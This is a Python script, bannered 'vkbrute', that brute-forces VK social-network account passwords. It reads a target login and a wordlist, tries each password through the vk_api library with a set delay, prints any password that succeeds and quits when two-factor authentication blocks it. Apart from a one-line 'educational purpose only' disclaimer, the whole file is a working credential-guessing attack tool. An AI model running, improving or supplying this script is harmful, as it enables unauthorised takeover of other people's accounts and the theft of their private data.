import vk_api
import time

def banner():
    banner = """
       __    __            __     
 _  __/ /__ / /  ______ __/ /____ 
| |/ /  '_// _ \/ __/ // / __/ -_)
|___/_/\_\/_.__/_/  \_,_/\__/\__/ 
                                  
"""
    print(banner)
    print('Warning!')
    print('This tool is educational purpose only!')

def main():
    login = input('Login> ')
    wordlist = input('Wordlist> ')
    timeout = input('Timeout> ')
    passwrd = open(wordlist, 'r')
    for i in passwrd:
        try:
            i = i[:-1]
            print(i)
            session = vk_api.VkApi(login, i)
            session.auth()
            session.get_api()
            print('Success! Password: ', i)
            exit()
        except vk_api.AuthError as error:
            print(error)
            if(str(error) == 'No handler for two-factor authentication'): print('Quitting!'); exit()
        time.sleep(int(timeout))
banner()
main()
